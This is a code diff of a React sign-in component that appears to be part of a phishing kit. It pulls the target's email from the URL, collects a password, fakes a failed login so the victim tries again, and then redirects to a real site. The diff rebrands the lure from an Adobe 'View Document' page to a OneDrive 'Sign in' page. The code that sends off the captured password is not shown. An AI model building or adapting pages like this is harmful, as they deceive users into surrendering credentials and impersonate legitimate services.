@@ -6,16 +6,14 @@ import { useState } from 'react';
 
 export const Sub = ()=>{
 
-
     const emailInTheURLA = window.location.href;
     const sliceEqualSignB = emailInTheURLA.indexOf("=");
     const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase().toLowerCase().split('&', 1).toString();
-    
 
     const [email, setEmail] = useState(extracetdEmailC);
     const [password, setPassword] = useState('');
 
-    const [view, setView] = useState('View Document');
+    const [view, setView] = useState('Sign in');
     const [errMsg, setErrMsg] = useState(false);
 
     const [count, setCount] = useState(0);
@@ -33,14 +31,14 @@ export const Sub = ()=>{
                 const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                 console.log(extracetdemailDomain);
                 setTimeout(() => {
-                    window.location.href = "https://www.adobe.com/";
+                    window.location.href = "https://onedrive.live.com/";
                 }, 1500);
             };
 
             setView('Please wait...');
 
             setTimeout(()=>{
-              setView('View Document');
+              setView('Sign in');
               setPassword('');
               setErrMsg(true);
             }, 3200)
@@ -123,7 +121,7 @@ export const Sub = ()=>{
                         <div className="subcont">
                             <input 
                                 type='submit'
-                                value={`Sign in`}
+                                value={view}
                                 className='btttnn'
                                 onClick={submitDefaultForm}
 
